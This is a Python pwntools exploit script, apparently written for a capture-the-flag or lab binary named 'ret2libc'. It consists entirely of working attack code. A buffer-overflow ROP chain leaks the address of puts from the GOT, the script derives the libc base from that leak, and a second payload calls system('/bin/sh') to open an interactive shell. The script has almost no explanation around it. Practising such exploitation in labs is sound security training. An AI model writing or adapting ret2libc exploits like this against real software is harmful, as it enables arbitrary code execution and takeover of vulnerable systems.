from pwn import *
filename = "./ret2libc"
elf = ELF(filename)
libc = elf.libc 
local = 1
if local:
    r = process(filename)
else:
    node = ''
    num = 0
    r = remote(node,num)

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux', 'sp', '-h']

# gdb.attach(r,"b *0x401284")
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = 0x401249  
pop_rdi = 0x0000000000401333
ret = 0x000000000040101a    # why we use ret??
payload = b'\x00'*0x28 +p64(pop_rdi) +  p64(puts_got) + p64(puts_plt) + p64(main_addr)
r.sendlineafter(":",payload)
r.recvuntil("!")

puts_addr = u64(r.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) 
libc_base = puts_addr - 0x80e50
system_addr = libc_base + libc.sym['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

# print("puts_addr:",hex(puts_addr))
print("libc_base:",hex(libc_base))

payload = b'\x00'*0x28 +p64(pop_rdi) +  p64(bin_sh_addr) + p64(ret) +  p64(system_addr)
r.sendlineafter(":",payload)
r.recvuntil("!")

r.interactive()




